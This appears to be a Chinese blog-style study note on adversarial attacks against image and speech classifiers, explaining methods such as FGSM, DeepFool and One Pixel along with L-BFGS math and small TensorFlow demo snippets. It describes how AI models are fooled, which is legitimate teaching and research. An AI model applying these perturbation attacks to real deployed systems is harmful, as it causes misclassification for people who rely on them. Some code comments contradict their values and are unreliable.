：在知道目标模型的完整知识，包括它的参数值、架构、训练方法，在某些情况下还有它的训练数据的情况下进行攻击. Adversarial perturbation ：被加在原图像上的噪声使原图像成为对抗样本 Adversarial training ：使用对抗图像样本来进行训练 Adversary ：一般指创造对抗样本的人，有时候样本本身也叫做这个 Black-box attacks ：测试过程中，在不了解该模型的情况下，为目标模型提供生成的实例的攻击. Fooling ratio/rate ：表示经过训练的模型在图像被扰动后改变其预测标签的百分比 One-shot/one-step methods ：通过执行一步计算产生一个对抗性的扰动，如一次计算模型损失梯度。与之相反的是迭代方法，即多次执行相同的计算以获得单个扰动。 Quasi-imperceptible ：对于人类的感知来说，干扰对图像的影响非常轻微。 Rectifier ：修改一个对抗性的示例，以将目标模型的预测恢复为同一示例的干净版本上的预测。 Targeted attacks ：骗过一个模型，让它错误地预测出敌对形象的特定标签。 ¶3. 神经对抗攻击 第三节中论文主要分为两大部分来进行介绍 在第3.1部分中，我们回顾了攻击深度神经网络的方法，这些方法执行计算机视觉中最常见的任务，即分类/识别。在第3.2部分中讨论了主要用于攻击深度学习的方法。 ¶3.1 Attacks for classification ¶3.1.1 Box-constrained L-BFGS Szegedy等人首先证明了图像存在小扰动，如扰动图像可以欺骗深度学习模型，使其误分类。设Ic∈Rm表示一个向量化的干净图像——下标‘c’强调该图像是干净的。为了计算一个可加性扰动ρ∈Rm，它会对图像产生非常轻微的扭曲，从而欺骗网络，Szegedy等人提出解决问题的公式: min⁡ρ∥ρ∥2 s.t. C(Ic+ρ)=ℓ;Ic+ρ∈[0,1]m\\min _{\\boldsymbol{\\rho}}\\|\\boldsymbol{\\rho}\\|_{2} \\text { s.t. } \\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)=\\ell ; \\mathbf{I}_{c}+\\boldsymbol{\\rho} \\in[0,1]^{m} ρmin​∥ρ∥2​ s.t. C(Ic​+ρ)=ℓ;Ic​+ρ∈[0,1]m 其中′ℓ′&#x27; \\ell^{\\prime}′ℓ′为图像的标签，C(.)为深度神经网络分类器。在这种情况下，上式成为一个困难的问题。因此他们利用box-constrained的L-BFGS寻求一个近似解。这是通过找到最小c &gt; 0来实现的，对于它，下面问题的最小ρ满足条件C(Ic+ρ)=ℓ\\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)=\\ellC(Ic​+ρ)=ℓ: min⁡ρc∣ρ∣+L(Ic+ρ,ℓ) s.t. Ic+ρ∈[0,1]m\\min _{\\boldsymbol{\\rho}} c|\\boldsymbol{\\rho}|+\\mathcal{L}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}, \\ell\\right) \\text { s.t. } \\mathbf{I}_{c}+\\boldsymbol{\\rho} \\in[0,1]^{m} ρmin​c∣ρ∣+L(Ic​+ρ,ℓ) s.t. Ic​+ρ∈[0,1]m L(.,.)\\mathcal{L}(., .)L(.,.)计算分类器的损失。我们注意到上式使得具有凸损失函数的分类器具有精确的结果。然而，对于深度神经网络来说，情况通常不是这样。计算的扰动只是添加到图像，使它成为一个对抗的例子。 上述方法能够计算当将噪声添加到干净图像时对神经网络的扰动，但是对抗性图像看起来与人类视觉系统的干净图像相似。Szegedy等人观察到一个神经网络计算的扰动也能够欺骗多个网络。这些惊人的结果发现了深度学习中的一个盲点。在这个发现的时候，计算机界正在迅速适应这样一种印象：深度学习特征定义了一个空间，在这个空间中，感知距离可以很好地近似于欧几里德距离。因此，这些相互矛盾的结果引发了研究人员对计算机视觉深度学习对抗性攻击的广泛兴趣。 ¶补充说明：L-BFGS算法 参考博客链接：https://blog.csdn.net/weixin_39445556/article/details/84502260 我们知道算法在计算机中运行的时候是需要很大的内存空间的.就像我们解决函数最优化问题常用的梯度下降,它背后的原理就是依据了泰勒一次展开式.泰勒展开式展开的次数越多,结果越精确,没有使用三阶四阶或者更高阶展开式的原因就是目前硬件内存不足以存储计算过程中演变出来更复杂体积更庞大的矩阵.L-BFGS算法翻译过来就是有限内存中进行BFGS算法,L是limited memory的意思. 算法为什么叫做BFGS呢？这就是四个数学家名字的简称而已，不用过多的在意 学习BFGS必须要先了解牛顿法的求根问题. 牛顿法求根问题 牛顿发现,一个函数的根从物理的角度就可以根据函数图像迭代求得.牛顿法求根的思路是: ​ a.在X轴上随机一点x1,经过x1做X轴的垂线,得到垂线与函数图像的交点f（x1） ​ b.通过f（x1）做函数的切线,得到切线与X轴的交点x2 ​ c.迭代a/b两步. ​ 下面附上一张动图方便理解: ​ ​ 通过图片我们可以看到.在X轴上取的点会随着迭代次数的增加而越来越接近函数的根.经过无限多次的迭代xnx_nxn​,就等于函数f(x)的根.但牛顿法在实际应用的时候我们不会让算法就这么迭代下去,所以当xk−1x_{k-1}xk−1​和xkx_{k}xk​相同或者两个值的差小于一个阈值的时候,xkx_{k}xk​就是函数f(x)f(x)f(x)的根. ​ 那么问题来了,怎么样找到f(x)f(x)f(x)的导函数与X轴的交点.请看下图: . 图片是上边动图从x1x_{1}x1​到x2x_{2}x2​的动作.可以看到,三角形绿色的直角边的值是x1−x2x_{1} - x_{2}x1​−x2​ , x1x_{1}x1​是已知的(随机出来的),而且函数表达式f(x)也是已知的(不知道要求的函数咱们折腾啥呢).所以三角形的另一条直角边f(x1)f(x_{1})f(x1​)也是已知的.根据导函数定义,函数f(x)在x1x_{1}x1​ 点的导函数就是f′(x)=f(x1)x1−x2f^{&#x27;}(x) = \\frac{f(x_{1})}{x_{1} - x_{2}}f′(x)=x1​−x2​f(x1​)​ (公式一). 公式一变换一下得到: x2=x1−f(x1)f′(x1)x_{2} =x_{1} - \\frac{ f(x_{1})}{f^{&#x27;}(x_{1})}x2​=x1​−f′(x1​)f(x1​)​ (公式二 ),同理可以得出每一次迭代xkx_{k}xk​的表达式都是 xk=xk−1−f(xk−1)f′(xk−1)x_{k} =x_{k-1} - \\frac{ f(x_{k-1})}{f^{&#x27;}(x_{k-1})}xk​=xk−1​−f′(xk−1​)f(xk−1​)​ (公式三). 所以,根据牛顿法求根的思路,我们可以总结(模仿)一下使用牛顿法求根的步骤: a.已知函数f(x)的情况下,随机产生点x0x_{0}x0​. b.由已知的x0x_{0}x0​点按照xk=xk−1−f(xk−1)f′(xk−1)x_{k} =x_{k-1} - \\frac{ f(x_{k-1})}{f^{&#x27;}(x_{k-1})}xk​=xk−1​−f′(xk−1​)f(xk−1​)​的公式进行k次迭代. c.如果xkx_{k}xk​与上一次的迭代结果xk−1x_{k-1}xk−1​相同或者相差结果小于一个阈值时,本次结果xkx_{k}xk​就是函数f(x)的根. 以上为牛顿法的求根的思路. 牛顿法求函数的驻点 我们知道,机器学习过程中的函数最优化问题,大部分优化的都是目标函数的导函数,我们要求得导函数为零时的点或近似点来作为机器学习算法表现最好的点.现在我们知道了牛顿求根法,那把牛顿求根法的函数换成咱们要优化的导函数不就行了么.要求的的导函数为零的点叫做驻点.所以用牛顿法求函数驻点同求函数的根是没有任何区别的.只是公式二中的f(x)f(x)f(x)变为了f′(x)f^{&#x27;}(x)f′(x),原来的f′(x)f^{&#x27;}(x)f′(x)变成了一阶导函数f′(x)f^{&#x27;}(x)f′(x)的导函数也就是二阶导函数f′′(x)f^{&#x27;&#x27;}(x)f′′(x),求xkx_{k}xk​的迭代公式如下: xk=xk−1−f′(xk−1)f′′(xk−1)x_{k} = x_{k-1} - \\frac{f^{&#x27;}(x_{k-1})}{f^{&#x27;&#x27;}(x_{k-1})}xk​=xk−1​−f′′(xk−1​)f′(xk−1​)​ (公式四) 这样,我们通过几何直觉,得到了求解函数根的办法,那这么厉害的一个想法,有没有什么理论依据作为支撑呢?当然有了,要不我也不这么问. 牛顿法求驻点的本质 牛顿法求驻点的本质其实是二阶泰勒展开.我们来看二阶泰勒展开式: φ(x)=f(xk)+f′(xk)(x−xk)+12f′′(xk)(x−xk)2\\varphi(x)=f\\left(x_{k}\\right)+f^{\\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)+\\frac{1}{2} f^{\\prime \\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)^{2} φ(x)=f(xk​)+f′(xk​)(x−xk​)+21​f′′(xk​)(x−xk​)2 φ(x)\\varphi (x)φ(x)是我们要求解的原函数的近似式.当我们要对原函数求解时,可以直接求得φ(x)\\varphi (x)φ(x)的导函数φ′(x)\\varphi^{&#x27;} (x)φ′(x) 令φ′(x)=0\\varphi^{&#x27;} (x) = 0φ′(x)=0时的结果就是原函数的解.所以对φ(x)\\varphi (x)φ(x)求导,消去常数项后得到公式如下: f′(xk)+f′′(xk)(x−xk)=0f^{\\prime}\\left(x_{k}\\right)+f^{\\prime \\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)=0 f′(xk​)+f′′(xk​)(x−xk​)=0 经过变换后所得的公式就是上边的公式四.所以,牛顿法求驻点的本质就是对函数进行二阶泰勒展开后变换所得到的结果. 在一元函数求解的问题中,我们可以很愉快的使用牛顿法求驻点,但我们知道,在机器学习的优化问题中,我们要优化的都是多元函数,所以x往往不是一个实数,而是一个向量.所以将牛顿求根法利用到机器学习中时,x是一个向量,f′(x)f^{&#x27;}(x)f′(x)也是一个向量,但是对f′(x)f^{&#x27;}(x)f′(x)求导以后得到的f′′(x)f^{&#x27;&#x27;}(x)f′′(x)是一个矩阵,叫做Hessian矩阵.等价公式如下: xk+1=xk−Hk−1⋅gk,k=0,1,⋯\\mathbf{x}_{k+1}=\\mathbf{x}_{k}-H_{k}^{-1} \\cdot \\mathbf{g}_{k}, \\quad k=0,1, \\cdots xk+1​=xk​−Hk−1​⋅gk​,k=0,1,⋯ 公式中,gkg_{k}gk​为公式四中的f′(x),Hk−1f^{&#x27;}(x),H_{k}^{-1}f′(x),Hk−1​代表二阶导函数的倒数. 当x的维度特别多的时候,我们想求得f′′(x)f^{&#x27;&#x27;}(x)f′′(x)是非常困难的.而牛顿法求驻点又是一个迭代算法,所以这个困难我们还要面临无限多次,导致了牛顿法求驻点在机器学习中无法使用.有没有什么解决办法呢? BFGS算法 BFGS算法是通过迭代来逼近Hk−1H_{k}^{-1}Hk−1​的算法.逼近的方式如下(公式五): Dk+1=(I−εkykTykTsk)Dk(I−ysskTykTsk)+sksTykTskD_{k+1}=\\left(I-\\frac{\\varepsilon_{k} \\mathbf{y}_{k}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}}\\right) D_{k}\\left(I-\\frac{\\mathbf{y}_{\\mathbf{s}} \\mathbf{s}_{k}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}}\\right)+\\frac{\\mathbf{s}_{k} \\mathbf{s}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}} Dk+1​=(I−ykT​sk​εk​ykT​​)Dk​(I−ykT​sk​ys​skT​​)+ykT​sk​sk​sT​ 公式五中的 DkD_{k}Dk​就是Hk−1.sk=xk+1−xk,yk=gk+1−gkH_{k}^{-1}.s_{k} = x_{k+1} - x_{k},y_{k} = g_{k+1} - g_{k}Hk−1​.sk​=xk+1​−xk​,yk​=gk+1​−gk​. gkg_{k}gk​是原函数的导函数. DkD_{k}Dk​的迭代公式复杂无比,还好我们不用记住它.BFGS是通过迭代来逼近Hk−1H_{k}^{-1}Hk−1​矩阵,第一步的D矩阵是单位矩阵. 我们要通过牛顿求驻点法和BFGS算法来求得一个函数的根,两个算法都需要迭代,所以我们干脆让他俩一起迭代就好了.两个算法都是慢慢逼近函数根,所以经过k次迭代以后,所得到的解就是机器学习中目标函数导函数的根.这种两个算法共同迭代的计算方式,我们称之为On The Fly.个人翻译:让子弹飞~ 回顾一下梯度下降的表达式Θk=Θk+1−α⋅g\\Theta_{k} = \\Theta_{k+1} - \\alpha \\cdot gΘk​=Θk+1​−α⋅g ,在BFGS算法迭代的第一步,单位矩阵与梯度g相乘,就等于梯度g,形式上同梯度下降的表达式是相同的.所以BFGS算法可以理解为从梯度下降逐步转换为牛顿法求函数解的一个算法. 虽然我们使用了BFGS算法来利用单位矩阵逐步逼近H矩阵,但是每次计算的时候都要存储D矩阵,D矩阵有多大呢.假设我们的数据集有十万个维度(不算特别大),那么每次迭代所要存储D矩阵的结果是74.5GB.我们无法保存如此巨大的矩阵内容,如何解决呢? 使用L-BFGS算法. L-BFGS算法: 我们每一次对D矩阵的迭代,都是通过迭代计算sks_{k}sk​和yky_{k}yk​得到的.既然存不下D矩阵,那么我们存储下所有的sks_{k}sk​和yky_{k}yk​想要得到D10D_{10}D10​就用单位矩阵同存储下的s1s_{1}s1​和y1y_{1}y1​到s10s_{10}s10​和y10y_{10}y10​计算就可以了.这样一个时间换空间的办法可以让我们在数据集有10000个维度的情况下,由存储10000 x 10000的矩阵变为了存储十个1 x 10000的10个向量,有效节省了内存空间. 但是,仅仅是这样还是不够的,因为当迭代次数非常大的时候,我们的内存同样存不下.这个时候只能丢掉一些存不下的数据.假设我们设置的存储向量数为100,当s和y迭代超过100时,就会扔掉第一个s和y,存储s_{2}到s_{101}和y_{2}到y_{101},每多一次迭代就对应的扔掉最前边的s和y.这样虽然损失了精度,但确可以保证使用有限的内存将函数的解通过BFGS算法求得到. 所以L-BFGS算法可以理解为对BFGS算法的又一次近似. ¶3.1.2 Fast Gradient Sign Method (FGSM) FGSM是一种白盒攻击； Szegedy等人[22]观察到，对抗性训练可以提高深层神经网络对对抗性例子的鲁棒性。（对抗性训练就是指将生成的对抗性样本加入到训练集当中来进行进一步的训练） 为了实现有效的对抗性训练，Goodfello等人[23]开发了通过解决以下问题，有效计算给定图像的对抗性扰动的方法： ρ=ϵsign⁡(∇J(θ,Ic,ℓ))\\rho=\\epsilon \\operatorname{sign}\\left(\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)\\right) ρ=ϵsign(∇J(θ,Ic​,ℓ)) ∇J(.,.,.)\\nabla \\mathcal{J}(.,.,.)∇J(.,.,.)计算围绕模型参数当前值的成本函数的梯度;ϵ\\epsilonϵ是限制微扰范数的小标量值。这种方法叫做FGSM（Fast Gradient Sign Method）算法。 有趣的是，FGSM产生的对抗性例子利用了高维空间中深层网络模型的“线性”，而这种模型当时通常被认为是高度非线性的。古德费罗等人[23]假设，现代深层神经网络的设计（有意）为计算增益引入线性行为，也使它们容易受到廉价的分析扰动。在相关文献中，这一观点通常被称为“线性假设”，这一点得到了FGSM方法的证实。 FGSM对图像进行扰动，以增加分类器在结果上的损失。sign函数保证了损失大小最大化，而ε本质上限制了ℓ∞\\ell_{\\infty}ℓ∞​ -norm的扰动。Miyato等人[103]提出的计算方法，如下所示： ρ=ϵ∇J(θ,Ic,ℓ)∥∇J(θ,Ic,ℓ)∥2\\boldsymbol{\\rho}=\\epsilon \\frac{\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)}{\\left\\|\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)\\right\\|_{2}} ρ=ϵ∥∇J(θ,Ic​,ℓ)∥2​∇J(θ,Ic​,ℓ)​ 在上面的方程中，计算的梯度用ℓ2\\ell_2ℓ2​范数正则化。Kurakin等人[80]将该技术称为&quot;快速梯度L2&quot;方法，并提出了使用ℓ∞\\ell_{\\infty}ℓ∞​范数进行归一化的替代方法，这个方法被叫做“快速梯度ℓ∞\\ell_{\\infty}ℓ∞​”方法。从广义上讲，在计算机视觉对抗性攻击的相关文献中，所有这些方法都被叫做 ‘one-step’ or ‘one-shot’ “一步式”或“一次性”方法。 补充说明：FGSM算法 参考文章： 干货 | 攻击AI模型之FGSM算法 FGSM最早由Goodfellow在其论文《Explaining and Harnessing Adversarial Examples》[23] 中提出。以最常见的图像识别为例，我们希望在原始图片上做肉眼难以识别的修改，但是却可以让图像识别模型产生误判。假设图片原始数据为x，图片识别的结果为y，原始图像上细微的变化肉眼难以识别，使用数学公式表示如下。 x~=x+η\\widetilde{x}=x+\\eta x=x+η 将修改后的图像输入分类模型中，x与参数矩阵相乘。 wTx~=wTx+wTηw^{T} \\widetilde{x}=w^{T} x+w^{T} \\eta wTx=wTx+wTη 对分类结果的影响还要受到激活函数的作用，攻击样本的生成过程就是追求以微小的修改，通过激活函数的作用，对分类结果产生最大化的变化。Goodfellow指出，如果我们的变化量与梯度的变化方向完全一致，那么将会对分类结果产生最大化的变化。 η=ϵsign⁡(grad⁡(w,x,y))\\eta=\\operatorname{\\epsilon sign}(\\operatorname{grad}(w, x, y)) η=ϵsign(grad(w,x,y)) 其中sign函数可以保证变化量与梯度函数方向一致。 当x的维数为n时，模型的参数在每个维度的平均值为m，每个维度的微小修改与梯度函数方向一致，累计的效果为： mnϵmn \\epsilon mnϵ 可见当原始数据的维度越大，攻击的累计效果越明显。以一个更加直观的例子来说明FGSM的原理。 假设具有2000个样本，每个数据具有1000维，每维的数据的数值的大小都在0-1之间随机生成，分类标签只有2种。 123456789101112131415import tensorflow as tffrom tensorflow.keras import *print(tf.__version__)print(tf.test.is_gpu_available())import sklearnfrom sklearn.preprocessing import MinMaxScaler# feather numbern_features = 1000x,y=datasets.make_classification(n_samples=2000, n_features=n_features, n_classes=2, random_state=random_state)# Standardized to 0-1x = MinMaxScaler().fit_transform(x) 分类模型是一个非常简单的神经网络，输入层大小为1000，输出层为1，激活函数为sigmoid。 1model = tf.keras.models.Sequential([layers.Dense(1,activation=&#x27;sigmoid&#x27;)]) sigmoid函数是非常经典的激活函数，取值范围为0-1，特别适合表示概率分布。 损失函数使用最简单的mse，优化方式使用adam，考核的指标为准确度accuracy。 12345678model.compile(loss=&#x27;mse&#x27;,optimizer=&#x27;adam&#x27;,metrics=[&#x27;accuracy&#x27;])model.fit( #使用model.fit()方法来执行训练过程， x, y, #告知训练集的输入以及标签， batch_size = 16, #每一批batch的大小为32， epochs = 50, #迭代次数epochs为500 validation_split = 0.2, #从测试集中划分80%给训练集 validation_freq = 10 #测试的间隔次数为20) 批处理大小为16，经过50轮训练。 12model.fit(x_train, y_train, validation_data=(x_val, y_val), epochs=100) 最终训练结果，损失值稳定在0.015左右，准确度为70% 左右； 1model.summary() 由于数据是随机生成的，我们取1号举例，可以看到标签是0，结果也是很接近1的 1234567891011import numpy as npx1 = x[1]y1 = y[1]x1 = np.expand_dims(x1,axis=0)y1_predict = model.predict(x1)print(y1)print(y1_predict)Out:0[[0.15540801]] 根据公式： η=ϵsign⁡(grad⁡(w,x,y))\\eta=\\operatorname{\\epsilon sign}(\\operatorname{grad}(w, x, y)) η=ϵsign(grad(w,x,y)) 我们知道下一步需要计算：模型在x1处的梯度： 12345x1 = tf.convert_to_tensor(x1)with tf.GradientTape(persistent=True) as g: g.watch(x1) y = model(x1)gradient = g.gradient(y, x1) 接下来跟着公式进行计算即可： e我们取0.1 可以认为对原来改变的很小 1234e = 0.1n = np.sign(gradient)x_ = x1 + n * eprint(model(x_)) 可以看到预测的结果完全变了！ ¶Basic &amp; Least-Likely-Class Iterative Methods one step方法通过在的方向上迈出一大步（即一步梯度上升）增加分类器的损失来扰动图像。这个想法的一个直观扩展是迭代地采取多个小步骤同时调整每一步后的方向。基本迭代法（BIM）[35]正是这样做的，并且迭代计算如下： Iρi+1=Clip⁡ϵ{Iρi+αsign⁡(∇J(θ,Iρi,ℓ)}\\mathbf{I}_{\\rho}^{i+1}=\\operatorname{Clip}_{\\epsilon}\\left\\{\\mathbf{I}_{\\rho}^{i}+\\alpha \\operatorname{sign}\\left(\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{\\rho}^{i}, \\ell\\right)\\right\\}\\right. Iρi+1​=Clipϵ​{Iρi​+αsign(∇J(θ,Iρi​,ℓ)} Iρi\\mathbf{I}_{\\rho}^{i}Iρi​表示第i次迭代时的扰动图像，Clip 就是剪掉变化过大的部分； BIM算法从Iρ0=Ic\\mathbf{I}_{\\rho}^{0}=\\mathbf{I}_{c}Iρ0​=Ic​开始，按照公式⌊min⁡(ϵ+4,1.25ϵ)⌋\\lfloor\\min (\\epsilon+4,1.25 \\epsilon)\\rfloor⌊min(ϵ+4,1.25ϵ)⌋确定的迭代次数运行。Madry等人[55]指出，BIM等价于投影梯度下降（PGD）的ℓ∞\\ell_{\\infty}ℓ∞​版本，PGD是一种标准的凸优化方法。 与将FGSM扩展到 “一步目标类” 变体类似（通过迭代的方式使得图像的识别趋近于某一个类别），Kurakin等人[35]也将BIM扩展到迭代最小可能类方法（ILCM）。在这种情况下，用分类器预测的最不可能类的目标标签ltargetl_{target}ltarget​替换中的图像的标签lll。 ILCM方法生成的对抗性示例已被证明严重影响了分类的精度，即使ε的值非常小，例如&lt;16。 ILCM的实现过程可以说与FGSM如出一辙，区别就在于迭代的次数和诱导分类器预测的目标标签不同； ¶3.1.4 Jacobian-based Saliency Map Attack (JSMA) 目前通过限制ℓ∞\\ell_{\\infty}ℓ∞​ 或者 ℓ2\\ell_{2}ℓ2​ -norms来实现对网络扰动的情况比较常见；Papernot等人[60]也通过限制扰动的l0l_0l0​范数来制造对抗性攻击。这意味着目标是只修改图像中的几个像素，而不是干扰整个图像来欺骗分类器。他们生成所需对抗图像的算法关键如下: 该算法一次修改一个干净图像的像素，并监控变化对结果分类的影响。 通过使用网络层的输出的梯度计算显著性图(computing a saliency map)来执行监视。 在map中，较大的值表示可以成功愚弄网络将ltargetl_{target}ltarget​预测为&quot;修改图像&quot;的标签而不是原始标签lll的可能性较高。一旦map被计算出来，算法就会选择最有效的像素来欺骗网络并改变它。重复这个过程，直到敌对图像中允许的最大像素数被改变，或者愚弄成功。 ¶3.1.5 One Pixel Attack 对抗攻击的一个极端情况是，只改变图像中的一个像素以欺骗分类器。有趣的是，Su等人[68]声称，在70.97%的测试图像上，通过改变每幅图像的一个像素，成功地愚弄了三种不同的网络模型。他们还报告说，网络对错误标签的平均置信度为97.47%。 Su等人利用（Differential Evolution）差异进化的概念计算了对抗性例子[148]。对于一个干净的图像，他们首先在R5\\mathbb{R}^{5}R5中创建了一组400个向量，使得每个向量包含xy坐标；然后给这些向量随机的RGB。 然后，他们随机修改向量的元素来创建子对象，使得子对象在下一次迭代中与其父对象竞争适应度（fitness criterion），同时使用网络的概率预测标签作为适应度准则。最后幸存的子对象用于改变图像中的像素。 即使这样一个简单的进化策略，Su等人[68]也能成功地愚弄了深层网络。注意，差分进化使他们的方法能够产生对抗性的例子，而不需要获得任何关于网络参数值或其梯度的信息。他们的技术需要的唯一输入是目标模型预测的概率标签。让就是说这种攻击的方法属于黑盒攻击； ¶3.1.6 Carlini and Wagner Attacks (C&amp;W) 卡里尼和瓦格纳[36]提出了一系列的三次对抗性攻击，这是在对抗性干扰[38]的防御升华之后提出的。这些攻击通过限制扰动的ℓ2\\ell_{2}ℓ2​、ℓ∞\\ell_{\\infty}ℓ∞​和ℓ0\\ell_{0}ℓ0​范数使扰动具有准不可察觉性，并且证明了针对目标网络的防御蒸馏几乎完全不能抵抗这些攻击。此外，本文还证明了利用不安全（未蒸馏）网络生成的对抗性例子可以很好地转移到安全（蒸馏）网络，这使得计算出的扰动适合于黑盒攻击。 然而更常见的是利用对抗性例子的可转移性来生成黑盒攻击，Chen等人[41]还提出了基于“零阶优化（ZOO）”的攻击，直接估计目标模型的梯度来生成对抗性例子。这些攻击的灵感来自C&amp;W攻击。 补充说明：C&amp;W攻击 ¶3.1.7 DeepFool Moosavi-dezfouli等人[72]提出了一个迭代计算最小范数对抗性扰动的方法。DeepFool用干净的图像初始化，该图像被假定位于由分类器的决策边界限定的区域中。这个区域决定了图像的类标签。At each iteration, the algorithm perturbs the image by a small vector that is computed to take the resulting image to the boundary of the polyhydron that is obtained by linearizing the boundaries of the region within which the image resides.每次迭代中添加到图像上的扰动被累加，一旦扰动图像根据网络的原始决策界改变其标签，就计算出最终的扰动。作者证明了DeepFool算法能够计算出比FGSM[23]计算的扰动范数更小的扰动，同时具有相似的愚弄率。 实现过程与FGSM也是比较类似的； 下面我们看一下Deep Fool算法和FGSM算法去攻击同一个图像修改量的对比图： 可以看到Deep Fool的修改量明显的要小于FGSM； 除了迭代环节，DeepFool与FGSM的算法完全相同。在迭代环节，我们可以通过NumPy的inalg.norm函数对梯度进行处理，然后迭代更新图片内容。 1234567891011121314151617# Deep Fool 攻击代码的迭代while cost &lt; 0.6: cost,gradients = grab_cost_and_gradients_from_model([hacked_image,0]) r= gradients*cost/pow(np.linalg.norm(gradients), 2) hacked_image +=r hacked_image = np.clip(hacked_image, max_change_below, max_change_above) hacked_image = np.clip(hacked_image, -1.0, 1.0) # FGSM算法的迭代while cost &lt; 0.60: cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0]) n=np.sign(gradients) hacked_image +=n*e hacked_image = np.clip(hacked_image, max_change_below, max_change_above) hacked_image = np.clip(hacked_image, -1.0, 1.0) ¶3.1.8 Universal Adversarial Perturbations ​ 然而像FGSM[23]、ILCM[35]、Deep-Fool[72]等方法计算扰动来愚弄单个图像上的网络，Moosavi Dezfouli等人[16]计算的“普遍”对抗扰动能够以高概率愚弄“任何”网络。如图1所示，这些图像不可知的扰动对于人类视觉系统来说仍然是准不可察觉的。为了正式定义这些扰动，让我们假设干净的图像是从分布ℑc\\Im_{c}ℑc​采样的。如果扰动ρ满足以下约束条件，则它是“普适的”： PIc∼ℑc(C(Ic)≠C(Ic+ρ))≥δ s.t. ∥ρ∥p≤ξ\\underset{\\mathbf{I}_{c} \\sim \\Im_{c}}{\\mathrm{P}}\\left(\\mathcal{C}\\left(\\mathbf{I}_{c}\\right) \\neq \\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)\\right) \\geq \\delta \\text { s.t. }\\|\\boldsymbol{\\rho}\\|_{p} \\leq \\xi Ic​∼ℑc​P​(C(Ic​)​=C(Ic​+ρ))≥δ s.t. ∥ρ∥p​≤ξ 其中P(.)P(.)P(.)表示概率，δ∈(0,1]\\delta \\in(0,1]δ∈(0,1]表示愚弄比率，∥.∥p\\|.\\|_{p}∥.∥p​表示ℓp\\ell_{p}ℓp​范数，ξ,\\xi,ξ,是预定义的参数。ξ,\\xi,ξ,值越小，就越难察觉图像中的扰动。严格地说，满足上述公式的扰动应称为(δ,ξ)(\\delta, \\xi)(δ,ξ) -universal ，因为它们对上述参数有很强的依赖性。然而，这些扰动在文献中通常被称为普遍的对抗性扰动（universal adversarial pertur- bations）。 作者通过限制 ℓ2\\ell_{2}ℓ2​范数和ℓ∞\\ell_{\\infty}ℓ∞​范数计算了universal perturbations ，结果表明，对于最先进的图像分类器，其范数上界为各自图像范数的4%的扰动，这样的扰动已经达到了约0.8或着更高的愚弄率。他们计算扰动的迭代方法与DeepFool策略[72]有关，该策略将数据点（即图像）逐渐推到其类的决策边界。然而，在这种情况下，“所有”训练数据点被依次推到各自的决策边界，并且通过每次将累加器向后投影到半径 ξ\\xiξ的所需ℓp\\ell_{p}ℓp​球，在所有图像上计算的扰动被逐渐累积。 Moosavi Dezfouli等人[16]提出的算法在针对单个网络模型时计算扰动，例如ResNet[147]。这些扰动也可以很好地推广到不同的网络（特别是具有相似结构的网络）。从这个意义上说，作者声称扰动在某种程度上是“双重普遍的”。此外，高愚弄率只使用大约2000张训练图像来学习扰动就可以实现了。 Khrulkov等人[190]还提出了一种将普遍对抗性扰动构造为网络特征映射的雅可比矩阵奇异向量的方法，这种方法允许仅使用少量图像获得相对较高的欺骗率。另一种产生普遍扰动的方法是Mopuri等人[135]提出的快速特征愚弄。他们的方法产生了与数据无关的普遍扰动。 ¶3.1.9 UPSET and ANGRI ​ Sarkar等人[146]提出了两种黑盒攻击算法，即 UPSET: Universal Perturbations for Steering to Exact Targets, 和ANGRI: Antagonistic Network for Generating Rogue Images 有针对性地愚弄深层神经网络。对于“n”类，UPSET寻求产生“n”图像不可知扰动，这样当扰动被添加到不属于目标类的图像时，分类器将扰动图像分类为来自该类。UPSET的效果来自一个residual generating network R(.),\\mathrm{R}(.),R(.), 它将目标类“t”作为输入，并生成一个扰动R(t)\\mathrm{R}(\\mathrm{t})R(t) 以供愚弄。整体方法使用所谓的UPSET- network解决以下优化问题： Iρ=max⁡(min⁡(sR(t)+Ic,1),−1)\\mathbf{I}_{\\boldsymbol{\\rho}}=\\max \\left(\\min \\left(s \\mathbf{R}(\\mathbf{t})+\\mathbf{I}_{c}, 1\\right),-1\\right) Iρ​=max(min(sR(t)+Ic​,1),−1) 其中，Ic\\mathbf{I}_{c}Ic​中的像素值被标准化在[-1,1]之间，并且s′s^{\\prime}s′是标量. 为确保为有效图像，将剪裁间隔[-1,1]之外的所有值。与图像不可知的UPSET相比，ANGRI以一种密切相关的方式计算图像特定的扰动. ANGRI产生的扰动也被用于有针对性的愚弄。据报道，这两种算法在MNIST[10]和CIFAR-10[152]数据集上都实现了高愚弄率。每一种算法的具体实现我会在接下来的其他文章中逐个进行介绍； ¶3.1.10 Houdini ​ Cisse等人[131]提出了“Houdini”，这是一种通过生成对抗性的例子来愚弄 “基于梯度学习的算法”。对抗性例子可以根据任务损失进行调整。产生对抗性例子的典型算法采用网络可微损失函数的梯度来计算扰动。然而，任务损失通常不适合这种方法。例如，语音识别的任务损失是基于字错误率的，这不允许直接利用损失函数梯度。Houdini是专门为此类任务生成对抗性示例的。除了可以成功生成攻击分类算法的敌对图像外，Houdini还被证明成功攻击了流行的自动语音识别系统[151]. 作者还通过在黑盒攻击场景中愚弄google voice，证明了语音识别中攻击的可转移性。此外，成功的目标攻击和非目标攻击也证明了深度学习模型的人体姿态估计。 ¶3.1.11 Adversarial Transformation Networks (ATNs) ​ Baluja和Fischer[42]训练了前馈神经网络（feed-forward neural net- works），用于生成对抗其他目标网络或网络集的对抗性示例。训练网络就叫做Adversarial Transformation Networks (ATNs). 